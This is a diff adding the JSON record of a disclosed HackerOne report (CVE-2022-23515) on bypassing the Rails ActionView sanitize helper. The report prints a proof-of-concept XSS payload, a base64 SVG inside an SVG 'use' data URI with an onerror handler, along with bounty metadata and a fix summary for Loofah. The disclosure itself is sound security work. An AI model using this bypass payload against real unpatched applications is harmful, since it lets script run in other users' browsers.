@@ -1,0 +1,161 @@
+{
+  "id": 1805873,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODA1ODcz",
+  "url": "https://hackerone.com/reports/1805873",
+  "title": "Rails ActionView sanitize helper bypass leading to XSS using SVG tag.",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2022-12-14T20:50:15.727Z",
+  "submitted_at": "2022-12-14T20:50:15.845Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "haqpl",
+    "url": "/haqpl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/nqha2oi4mj36dljeq1anfuiul7lj/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 54349,
+    "url": "https://hackerone.com/ibb",
+    "handle": "ibb",
+    "profile_picture_urls": {
+      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQSBFYJUY%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T213230Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDcW65kSymSaNy4CZyCDhQLdik0DtaOlyWRnqLjWzk3RAIgTd33tr3ZJq9t0pJVfCoaJwtyUpfavsUfh%2Ft7yXuELIEquwUIm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDAtFhHYI6cqDXXnI8CqPBYGyhC%2Bm2OitfCBe5W%2F3sJrKpM01CU0fiXLOQQVq1rBD6Bw0zOeJ5dumt6tKl5wzwcBnAc89HxEpGaloKAV29mI928EID5bjq2RQ5Q69fPjgU8w7yP56BiULsUteyoOpZfNkA5YPZ1w1ABPr4dKf6Mcpn5dBFkqlJ6ncaIRGpOj%2B%2FksVwJPqmyogcHBD5SPOFnW8qHFes7SU3QDjIaIQlJeU3Xvq8zuLYFbE0YntjdJOSXGqwg9f8hhYcQ4ts0gBp5mu5YZqbynnkjxYSvL0LXKhmtXFdMyltrBdlE3NisZ98pkbyM5stKgqOeILcpnakwmULIrqltIKLGy1AJutxUPrGNiX28iPDA5TaMblskXMiPHvBGJiDPOarFVLsgMXwDHtISBmMQJARsyrFqMPFOD5lCjeQ7HdMmAjdJjzJ3Ck5BbwsYFbuPz5GLOW%2BC8gulhx%2FDkUuvumkub81NSuAjwfgnkAW5xERSgfL8tdQKC4VFQIW9Ihe6n%2B7euSTGyJHnkvq59czvtrziRy%2B2vYIQ4tEDsVZxRwebWxnUMDnn6qDca3wd5UlmwA0Mfb3NjRyBSV4Lb%2BCG97c3eC9AAaWEibiqFoWbKJp7HHh6Oygox%2B%2BhVTbmhnP3219vsQWXU770uoMgrIRTqAkCXl556pnHL2H9Y5vl6W0pbPg4egE3qH1tUe%2BlAuPFJiH7bqTNn5j4NPG%2BBmoMp8COt1th2EHezAQZOr8kO3v4axBOLmPc6Qm9oHwTzKDR7uzmjgrfQFr5XLSlCgP%2F90%2FV%2FfoXypEoI40ke8AxPzzmdTcqzncpGv0%2FhJlfkv3bJLC2puBBb%2FuV5qelEB4C1g5HpPhQ4Qygtd5%2BDj8m%2BR%2Fo0zRp7OTUcwgcLizAY6sQGL3hACspXt2XGln09dtWrFlQPYrVzH%2F7pHIUS1YdhHlli%2B3mYnwRWECjzDBzaV5P50aNpxEs7lqvg%2BTaWjjg%2FurmOnqMn8el7foQ0MfK1f3RdHd4Mgdf3TRPe3BAT6b3kvRuZC1ACR04DoxetNTsXTfRhGI%2BmR1nDdyEBNCdJ8aeVoWPB5dToHQZw3NY0yb%2FittmoijmR9hSXdrv0PBo9IT99JO7YeSAaMUZJQUtq4rDY%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=928f25691dfa19d110ebad9f3df9bab8306f0ed97884b1f8005e904aeeae85c8",
+      "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQSBFYJUY%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T213230Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDcW65kSymSaNy4CZyCDhQLdik0DtaOlyWRnqLjWzk3RAIgTd33tr3ZJq9t0pJVfCoaJwtyUpfavsUfh%2Ft7yXuELIEquwUIm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDAtFhHYI6cqDXXnI8CqPBYGyhC%2Bm2OitfCBe5W%2F3sJrKpM01CU0fiXLOQQVq1rBD6Bw0zOeJ5dumt6tKl5wzwcBnAc89HxEpGaloKAV29mI928EID5bjq2RQ5Q69fPjgU8w7yP56BiULsUteyoOpZfNkA5YPZ1w1ABPr4dKf6Mcpn5dBFkqlJ6ncaIRGpOj%2B%2FksVwJPqmyogcHBD5SPOFnW8qHFes7SU3QDjIaIQlJeU3Xvq8zuLYFbE0YntjdJOSXGqwg9f8hhYcQ4ts0gBp5mu5YZqbynnkjxYSvL0LXKhmtXFdMyltrBdlE3NisZ98pkbyM5stKgqOeILcpnakwmULIrqltIKLGy1AJutxUPrGNiX28iPDA5TaMblskXMiPHvBGJiDPOarFVLsgMXwDHtISBmMQJARsyrFqMPFOD5lCjeQ7HdMmAjdJjzJ3Ck5BbwsYFbuPz5GLOW%2BC8gulhx%2FDkUuvumkub81NSuAjwfgnkAW5xERSgfL8tdQKC4VFQIW9Ihe6n%2B7euSTGyJHnkvq59czvtrziRy%2B2vYIQ4tEDsVZxRwebWxnUMDnn6qDca3wd5UlmwA0Mfb3NjRyBSV4Lb%2BCG97c3eC9AAaWEibiqFoWbKJp7HHh6Oygox%2B%2BhVTbmhnP3219vsQWXU770uoMgrIRTqAkCXl556pnHL2H9Y5vl6W0pbPg4egE3qH1tUe%2BlAuPFJiH7bqTNn5j4NPG%2BBmoMp8COt1th2EHezAQZOr8kO3v4axBOLmPc6Qm9oHwTzKDR7uzmjgrfQFr5XLSlCgP%2F90%2FV%2FfoXypEoI40ke8AxPzzmdTcqzncpGv0%2FhJlfkv3bJLC2puBBb%2FuV5qelEB4C1g5HpPhQ4Qygtd5%2BDj8m%2BR%2Fo0zRp7OTUcwgcLizAY6sQGL3hACspXt2XGln09dtWrFlQPYrVzH%2F7pHIUS1YdhHlli%2B3mYnwRWECjzDBzaV5P50aNpxEs7lqvg%2BTaWjjg%2FurmOnqMn8el7foQ0MfK1f3RdHd4Mgdf3TRPe3BAT6b3kvRuZC1ACR04DoxetNTsXTfRhGI%2BmR1nDdyEBNCdJ8aeVoWPB5dToHQZw3NY0yb%2FittmoijmR9hSXdrv0PBo9IT99JO7YeSAaMUZJQUtq4rDY%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9a42c6828644bb0587263ea1c3918ed250b65c1577cafd3a8b9878af71b48c57"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Internet Bug Bounty",
+      "twitter_handle": "",
+      "website": "https://www.hackerone.com/internet-bug-bounty",
+      "about": "The Internet Bug Bounty rewards security research into vulnerabilities impacting Open Source Software Projects."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2022-23515"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2023-01-29T12:14:23.096Z",
+  "bug_reporter_agreed_on_going_public_at": "2023-01-29T12:14:22.991Z",
+  "team_member_agreed_on_going_public_at": "2023-01-04T13:27:03.958Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "In the specific configuration, it was possible to bypass HTML sanitization by using the `use` tag of the `SVG` element.\n\nIn the `index.html.erb`:\n\n```ruby\n<%= sanitize \"<svg><use href=\\\"data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEzMzcnIGhlaWdodD0nMTMzNyc+CjxpbWFnZSBocmVmPSIxIiBvbmVycm9yPSJhbGVydCh3aW5kb3cub3JpZ2luKSIgLz4KPC9zdmc+#x\\\"/></svg>\", tags: %w(svg use) %>\n```\n`use` tag allows to embed another base64 encoded `SVG` containing target XSS payload, base64 after decoding:\n\n```svg\n<svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='1337' height='1337'>\n<image href=\"1\" onerror=\"alert(window.origin)\" />\n</svg>\n```\n`SVG` and `use` tags had to be allowed either in global configuration  `config.action_view.sanitized_allowed_tags = ['svg', 'use']`\nor inline with `tags` argument of the helper.\n\n## Impact\n\nXSS could lead to data theft through the attacker’s ability to manipulate data through their access to the application, and their ability to interact with other users, including performing other malicious attacks, which would appear to originate from a legitimate user. These malicious actions could also result in reputational damage for the business through the impact on customers’ trust.",
+  "bounty_amount": "2400.0",
+  "formatted_bounty": "$2,400",
+  "weakness": {
+    "id": 60,
+    "name": "Cross-site Scripting (XSS) - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 2077048,
+      "file_name": "2022-09-07_23-29.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ay793090u3fh51owetqn538iny27?response-content-disposition=attachment%3B%20filename%3D%222022-09-07_23-29.png%22%3B%20filename%2A%3DUTF-8%27%272022-09-07_23-29.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQSBFYJUY%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T213230Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDcW65kSymSaNy4CZyCDhQLdik0DtaOlyWRnqLjWzk3RAIgTd33tr3ZJq9t0pJVfCoaJwtyUpfavsUfh%2Ft7yXuELIEquwUIm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDAtFhHYI6cqDXXnI8CqPBYGyhC%2Bm2OitfCBe5W%2F3sJrKpM01CU0fiXLOQQVq1rBD6Bw0zOeJ5dumt6tKl5wzwcBnAc89HxEpGaloKAV29mI928EID5bjq2RQ5Q69fPjgU8w7yP56BiULsUteyoOpZfNkA5YPZ1w1ABPr4dKf6Mcpn5dBFkqlJ6ncaIRGpOj%2B%2FksVwJPqmyogcHBD5SPOFnW8qHFes7SU3QDjIaIQlJeU3Xvq8zuLYFbE0YntjdJOSXGqwg9f8hhYcQ4ts0gBp5mu5YZqbynnkjxYSvL0LXKhmtXFdMyltrBdlE3NisZ98pkbyM5stKgqOeILcpnakwmULIrqltIKLGy1AJutxUPrGNiX28iPDA5TaMblskXMiPHvBGJiDPOarFVLsgMXwDHtISBmMQJARsyrFqMPFOD5lCjeQ7HdMmAjdJjzJ3Ck5BbwsYFbuPz5GLOW%2BC8gulhx%2FDkUuvumkub81NSuAjwfgnkAW5xERSgfL8tdQKC4VFQIW9Ihe6n%2B7euSTGyJHnkvq59czvtrziRy%2B2vYIQ4tEDsVZxRwebWxnUMDnn6qDca3wd5UlmwA0Mfb3NjRyBSV4Lb%2BCG97c3eC9AAaWEibiqFoWbKJp7HHh6Oygox%2B%2BhVTbmhnP3219vsQWXU770uoMgrIRTqAkCXl556pnHL2H9Y5vl6W0pbPg4egE3qH1tUe%2BlAuPFJiH7bqTNn5j4NPG%2BBmoMp8COt1th2EHezAQZOr8kO3v4axBOLmPc6Qm9oHwTzKDR7uzmjgrfQFr5XLSlCgP%2F90%2FV%2FfoXypEoI40ke8AxPzzmdTcqzncpGv0%2FhJlfkv3bJLC2puBBb%2FuV5qelEB4C1g5HpPhQ4Qygtd5%2BDj8m%2BR%2Fo0zRp7OTUcwgcLizAY6sQGL3hACspXt2XGln09dtWrFlQPYrVzH%2F7pHIUS1YdhHlli%2B3mYnwRWECjzDBzaV5P50aNpxEs7lqvg%2BTaWjjg%2FurmOnqMn8el7foQ0MfK1f3RdHd4Mgdf3TRPe3BAT6b3kvRuZC1ACR04DoxetNTsXTfRhGI%2BmR1nDdyEBNCdJ8aeVoWPB5dToHQZw3NY0yb%2FittmoijmR9hSXdrv0PBo9IT99JO7YeSAaMUZJQUtq4rDY%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bdf4d8d5d107c719a067f86b54de22993994c095afcf47d1556f986b939fc4ca",
+      "file_size": 220557,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2023-02-03T13:27:04.142Z",
+  "allow_singular_disclosure_after": -96192326.00936514,
+  "singular_disclosure_allowed": true,
+  "vote_count": 39,
+  "voters": [
+    "kurogai",
+    "haqpl",
+    "n1m0",
+    "tolga",
+    "zy9ard3",
+    "thruster",
+    "kannthu",
+    "shubham_srt",
+    "sudi",
+    "h4x0r_dz",
+    "and 29 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 80881,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/rails",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "id": 235020,
+      "category": "team",
+      "content": "###Summary\n\nLoofah ``>= 2.1.0, < 2.19.1`` is vulnerable to cross-site scripting via the ``image/svg+xml`` media type in data URIs.\n\n###Mitigation\n\nUpgrade to Loofah ``>= 2.19.1.``\n\n###Severity\n\nThe Loofah maintainers have evaluated this as [Medium Severity 6.1.](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)\n\n###References\n\n[CWE - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') (4.9)](https://cwe.mitre.org/data/definitions/79.html)\n[SVG MIME Type (image/svg+xml) is misleading to developers · Issue #266 · w3c/svgwg](https://github.com/w3c/svgwg/issues/266)\nhttps://hackerone.com/reports/1694173\n\n",
+      "updated_at": "2023-01-04T13:26:04.830Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 2032618,
+        "username": "pr0tag0nist",
+        "name": "p h",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": null,
+        "location": "",
+        "created_at": "2021-10-18T10:02:41.859Z",
+        "url": "https://hackerone.com/pr0tag0nist",
+        "hackerone_triager": false,
+        "hackerone_employee": true,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
+          "medium": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
+          "xtralarge": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+        }
+      }
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
